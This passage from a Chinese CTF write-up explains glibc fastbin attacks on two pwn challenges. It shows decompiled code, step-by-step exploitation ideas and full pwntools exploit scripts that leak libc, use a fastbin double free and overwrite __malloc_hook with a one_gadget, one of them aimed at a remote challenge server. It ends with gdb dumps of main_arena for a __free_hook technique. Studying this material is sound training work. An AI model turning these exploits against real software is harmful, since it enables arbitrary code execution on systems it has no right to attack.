<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_number )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x63</span> &amp;&amp; (v1 = (_DWORD *)chunk_array[v2]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">        *v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(chunk_array[v2] + <span class="number">8L</span>L));</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要利用思路：</p>
<ol>
<li>首先free出一个unsorted bin然后分配这个unsorted bin，利用<code>view</code>功能leak出<code>unsorted bin-&gt;bk</code>中残留的<code>main_arena</code>地址，从而得到libc基址，计算出<code>__malloc_hook</code>的地址。</li>
<li>由于fastbin的分配有size检查，所以不能直接分配<code>__malloc_hook</code>处，而是要利用上方的一些地址的高字节<code>0x7F</code>来伪造size字段，从而完成目标内存分配:<br> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/__malloc_hook.png" alt><br> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/size.png" alt></li>
<li>经过尝试，所有的onegadget都没办法直接打通，这里就需要借助fastbin double free corruption来间接触发<code>__malloc_hook</code>，这里使用的onegadget是条件为<code>[rsp+0x50]==NULL</code>的那个。<br>解题exp（有些地方有些奇怪是因为尝试过<code>realloc</code>调栈的方法，没成功，但懒得改了）：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name, color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Length of the name :"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"The name of flower :"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"The color of the flower :"</span>, color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name of the flower["</span> + str(index) + <span class="string">"] :"</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which flower do you want to remove from the garden:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">realloc_hook_offset = <span class="number">0x00000000003c3b08</span> <span class="comment"># libc.symbols["__relloc_hook"] # __malloc_hook = __realloc_hook + 0x8</span></span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf0567</span></span><br><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fast bin double free</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line"><span class="comment"># don't break the double free loop</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"\xe0"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">heap_addr = u64(view(<span class="number">2</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x10e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"E"</span> * <span class="number">8</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">main_arena = u64(view(<span class="number">5</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">realloc_hook = libc_base + realloc_hook_offset</span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the double free</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(realloc_hook + <span class="number">8</span> - <span class="number">0x23</span>), <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"FFFF"</span>) <span class="comment"># chunk 7</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"GGGG"</span>, <span class="string">"GGGG"</span>) <span class="comment"># chunk 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write realloc_hook and malloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, (p64(one_gadget) + p64(one_gadget)).rjust(<span class="number">0x1b</span>, <span class="string">"H"</span>), <span class="string">"HHHH"</span>) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger malloc_hook (use malloc_printerr, directly call malloc won't work)</span></span><br><span class="line"><span class="comment"># p.sendlineafter("Your choice : ", "1")</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr: "</span> + hex(heap_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"realloc_hook: "</span> + hex(realloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><b>一些题外话：</b><br>此外，我搜了很多关于<code>__malloc_printerr</code>是怎么触发<code>__malloc_hook</code>的，都没有找到原因。还是特别想知道，咋办？<br>把<code>__malloc_hook</code>写成<code>puts</code>，在触发前在<code>puts</code>处下断点，然后利用gdb的<code>backtrace</code>看下调用栈，藏得够深（还是<code>malloc</code>触发的，只不过这个这个<code>malloc</code>经过了N层函数调用，所以其实可以直接在<code>malloc</code>下断点就行了）。。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  _IO_puts (str=<span class="number">0x24</span> &lt;error: Cannot access memory at address <span class="number">0x24</span>&gt;) at ioputs.c:<span class="number">33</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fe6f4da3d8a</span> in __strdup (s=<span class="number">0x7ffd7c35b6a0</span> <span class="string">"/lib/x86_64-linux-gnu/libgcc_s.so.1"</span>) at strdup.c:<span class="number">42</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fe6f4d9f60f</span> in _dl_load_cache_lookup (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>) at dl-cache.c:<span class="number">311</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x00007fe6f4d8ff99</span> in _dl_map_object (loader=loader@entry=<span class="number">0x7fe6f4fab4d8</span>, name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, type=type@entry=<span class="number">0x2</span>, trace_mode=trace_mode@entry=<span class="number">0x0</span>, mode=mode@entry=<span class="number">0x90000001</span>, nsid=&lt;optimized out&gt;) at dl-load.c:<span class="number">2342</span></span><br><span class="line">#4  0x00007fe6f4d9c3a7 in dl_open_worker (a=a@entry=0x7ffd7c35bd90) at dl-open.c:237</span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=objname@entry=<span class="number">0x7ffd7c35bd80</span>, errstring=errstring@entry=<span class="number">0x7ffd7c35bd88</span>, mallocedp=mallocedp@entry=<span class="number">0x7ffd7c35bd7f</span>, operate=operate@entry=<span class="number">0x7fe6f4d9c300</span> &lt;dl_open_worker&gt;, args=args@entry=<span class="number">0x7ffd7c35bd90</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fe6f4d9bbd9</span> in _dl_open (file=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=<span class="number">0x80000001</span>, caller_dlopen=<span class="number">0x7fe6f4ad2fd1</span> &lt;__GI___backtrace+<span class="number">193</span>&gt;, nsid=<span class="number">0xfffffffffffffffe</span>, argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;, env=<span class="number">0x7ffd7c35cac8</span>) at dl-<span class="built_in">open</span>.c:<span class="number">660</span></span><br><span class="line">#7  0x00007fe6f4b009bd in do_dlopen (ptr=ptr@entry=0x7ffd7c35bfb0) at dl-libc.c:87</span><br><span class="line">#<span class="number">8</span>  <span class="number">0x00007fe6f4d97394</span> in _dl_catch_error (objname=<span class="number">0x7ffd7c35bfa0</span>, errstring=<span class="number">0x7ffd7c35bfa8</span>, mallocedp=<span class="number">0x7ffd7c35bf9f</span>, operate=<span class="number">0x7fe6f4b00980</span> &lt;do_dlopen&gt;, args=<span class="number">0x7ffd7c35bfb0</span>) at dl-error.c:<span class="number">187</span></span><br><span class="line">#9  0x00007fe6f4b00a74 in dlerror_run (args=0x7ffd7c35bfb0, operate=0x7fe6f4b00980 &lt;do_dlopen&gt;) at dl-libc.c:46</span><br><span class="line">#<span class="number">10</span> __GI___libc_dlopen_mode (name=name@entry=<span class="number">0x7fe6f4b49aa6</span> <span class="string">"libgcc_s.so.1"</span>, mode=mode@entry=<span class="number">0x80000001</span>) at dl-libc.c:<span class="number">163</span></span><br><span class="line">#11 0x00007fe6f4ad2fd1 in init () at ../sysdeps/x86_64/backtrace.c:52</span><br><span class="line">#<span class="number">12</span> __GI___backtrace (<span class="built_in">array</span>=<span class="built_in">array</span>@entry=<span class="number">0x7ffd7c35c010</span>, <span class="built_in">size</span>=<span class="built_in">size</span>@entry=<span class="number">0x40</span>) at ../sysdeps/x86_64/backtrace.c:<span class="number">105</span></span><br><span class="line">#13 0x00007fe6f49dd9f5 in backtrace_and_maps (do_abort=&lt;optimized out&gt;, do_abort@entry=0x2, written=&lt;optimized out&gt;, fd=fd@entry=0x3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47</span><br><span class="line">#<span class="number">14</span> <span class="number">0x00007fe6f4a357e5</span> in __libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7fe6f4b4e2e0</span> <span class="string">"*** Error in `%s': %s: 0x%s ***\n"</span>) at ../sysdeps/posix/libc_fatal.c:<span class="number">172</span></span><br><span class="line">#15 0x00007fe6f4a3de0a in malloc_printerr (ar_ptr=&lt;optimized out&gt;, ptr=&lt;optimized out&gt;, str=0x7fe6f4b4e3a8 "double free or corruption (fasttop)", action=0x3) at malloc.c:5004</span><br><span class="line">#<span class="number">16</span> _int_free (av=&lt;optimized out&gt;, p=&lt;optimized out&gt;, have_lock=<span class="number">0x0</span>) at <span class="built_in">malloc</span>.c:<span class="number">3865</span></span><br><span class="line">#<span class="number">17</span> <span class="number">0x00007fe6f4a4198c</span> in __GI___libc_free (mem=&lt;optimized out&gt;) at <span class="built_in">malloc</span>.c:<span class="number">2966</span></span><br><span class="line">#<span class="number">18</span> <span class="number">0x000055eca8269e79</span> in ?? ()</span><br><span class="line">#<span class="number">19</span> <span class="number">0x000000087c35cab0</span> in ?? ()</span><br><span class="line">#<span class="number">20</span> <span class="number">0x77c3b85bb5ec5800</span> in ?? ()</span><br><span class="line">#<span class="number">21</span> <span class="number">0x0000000000000000</span> in ?? ()</span><br></pre></td></tr></table></figure>
<p> 最后在<code>__strdup</code>里面调用了一次<code>malloc</code>触发了<code>__malloc_hook</code>：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">__strdup (<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">size_t</span> len = <span class="built_in">strlen</span> (s) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">new</span> = <span class="built_in">malloc</span> (len);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">char</span> *) <span class="built_in">memcpy</span> (<span class="keyword">new</span>, s, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> （有点好奇，咋发现的，这也tql。。）</p>
</blockquote>
<h4 id="Heap-Paradise"><a href="#Heap-Paradise" class="headerlink" title="Heap Paradise"></a>Heap Paradise</h4>程序很简单，<code>delete</code>功能存在明显的free后没有清空指针的漏洞，所以毋庸置疑又是fastbin double free：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">15</span> )</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
但是<code>add</code>功能限制了能分配的堆块的size：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You can't allocate anymore !"</span>);</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size :"</span>);</span><br><span class="line">    v0 = choice();</span><br><span class="line">    <span class="built_in">size</span> = v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        chunk_array[i] = <span class="built_in">malloc</span>(v0);</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Data :"</span>);</span><br><span class="line">        LODWORD(v0) = read_data((__int64)chunk_array[i], <span class="built_in">size</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
主要思路就是:</li>
<li>利用fastbin double free形成chunk overlap，创造出一个unsorted bin。</li>
<li>注意到题目是没有<code>view</code>功能的，所以只能通过partial overwrite <code>unsorted bin-&gt;fd</code>，使其指向<code>_IO_2_1_stdout</code>结构体附近，然后通过fastbin分配该处空间来更改结构体从而完成leak libc。</li>
<li>libc leak完成之后，剩下的就是再次利用fastbin double free改<code>__malloc_hook</code>为onegadget。</li>
<li>题目的难点在于，只能分配16次chunk，要在有限的chunk里完成这么多动作，考察的就是堆布局的能力了，所以至于如何布局这里就不再赘述了。<br>此外，由于我的写法在完成上述操作之后就用完的所有的<code>add</code>机会，所以只能通过fastbin double free corruption来触发<code>__malloc_hook</code>了。<br><br>我的exp（布局肯定不止这一种，仅供参考）：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line">malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data :"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"You Choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4600</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># fastbin double free</span></span><br><span class="line">        add(<span class="number">0x68</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"D"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) <span class="comment"># chunk 3</span></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create unsorted bin</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"\x10"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"F"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>)) <span class="comment"># chunk 7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># # free unsorted bin</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # malloc unsorted bin, perform partially write to stdout</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        add(<span class="number">0x58</span>, <span class="string">"G"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(<span class="number">0</span>)) <span class="comment"># chunk 8</span></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # brute force 4 bits</span></span><br><span class="line">        add(<span class="number">0x78</span>, <span class="string">"H"</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p16(<span class="number">0xa620</span> - <span class="number">0x43</span>)) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"IIII"</span>) <span class="comment"># chunk 10</span></span><br><span class="line">        add(<span class="number">0x68</span>, <span class="string">"J"</span> * <span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">"\x00"</span>) <span class="comment"># chunk 11</span></span><br><span class="line"></span><br><span class="line">        string = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> string == <span class="string">"****"</span> <span class="keyword">or</span> string == <span class="string">"read"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p.recv(<span class="number">0x40</span><span class="number">-4</span>)</span><br><span class="line">            libc_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">            libc_base = libc_addr - <span class="number">0x3c4600</span></span><br><span class="line">            malloc_hook = libc_base + malloc_hook_offset</span><br><span class="line">            one_gadget = libc_base + one_gadget_offset</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10308</span>)</span><br><span class="line">        <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>, p64(malloc_hook - <span class="number">0x23</span>)) <span class="comment"># chunk 12</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"KKKK"</span>) <span class="comment"># chunk 13</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"LLLL"</span>) <span class="comment"># chunk 14</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"I"</span> * <span class="number">0x13</span> + p64(one_gadget)) <span class="comment"># chunk 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># double free error ==&gt; malloc_printerr ==&gt; __malloc_hook</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _pwn_remote == <span class="number">1</span>:</span><br><span class="line">    context.log_level = <span class="string">"debug"</span></span><br><span class="line">    p.send(<span class="string">"cat /home/heap_paradise/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_addr: "</span> + hex(libc_addr))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"><span class="comment"># success("libc_realloc: " + hex(libc_realloc))</span></span><br><span class="line">success(<span class="string">"malloc_hook: "</span> + hex(malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="write-free-hook-through-top-chunk"><a href="#write-free-hook-through-top-chunk" class="headerlink" title="write __free_hook through top chunk"></a>write __free_hook through top chunk</h2><p>这应该是最稳的方法之一了，因为直接调<code>system(&quot;/bin/sh&quot;)</code>一般来说没有什么限制，但是利用起来还是要花一点功夫的。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>我们知道fastbin的malloc需要满足size的约束，但是<code>__free_hook</code>的上方全是”\x00”，显然无法直接分配，所以需要借助其他的办法。<br><br>首先了解一下<code>main_arena</code>的结构（这是堆块信息还没有被写入的时候）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$1 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x0, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;0x0 &lt;repeats 254 times&gt;&#125;, </span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x0, </span><br><span class="line">    max_system_mem &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见这个的<code>top</code>储存了top chunk的位置，也就是说当我们需要从top chunk分配内存空间的时候，会从这里获取top chunk的位置信息，然后再切割分配（下图是Glibc 2.27下的情况）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  p main_arena</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">    mutex &#x3D; 0x0, </span><br><span class="line">    flags &#x3D; 0x0, </span><br><span class="line">    have_fastchunks &#x3D; 0x0, </span><br><span class="line">    fastbinsY &#x3D; &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    top &#x3D; 0x555555757270, </span><br><span class="line">    last_remainder &#x3D; 0x0, </span><br><span class="line">    bins &#x3D; &#123;</span><br><span class="line">               0x7ffff7dcfca0 &lt;main_arena+96&gt;, 0x7ffff7dcfca0 &lt;main_arena+96&gt;, </span><br><span class="line">               0x7ffff7dcfcb0 &lt;main_arena+112&gt;, 0x7ffff7dcfcb0 &lt;main_arena+112&gt;,</span><br><span class="line">               ......</span><br><span class="line">               0x7ffff7dd0480 &lt;main_arena+2112&gt;, 0x7ffff7dd0480 &lt;main_arena+2112&gt;</span><br><span class="line">           &#125;</span><br><span class="line">    binmap &#x3D; &#123;0x0, 0x0, 0x0, 0x0&#125;, </span><br><span class="line">    next &#x3D; 0x7ffff7dcfc40 &lt;main_arena&gt;, </span><br><span class="line">    next_free &#x3D; 0x0, </span><br><span class="line">    attached_threads &#x3D; 0x1, </span><br><span class="line">    system_mem &#x3D; 0x21000, </span><br><span class="line">    max_system_mem &#x3D; 0x21000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
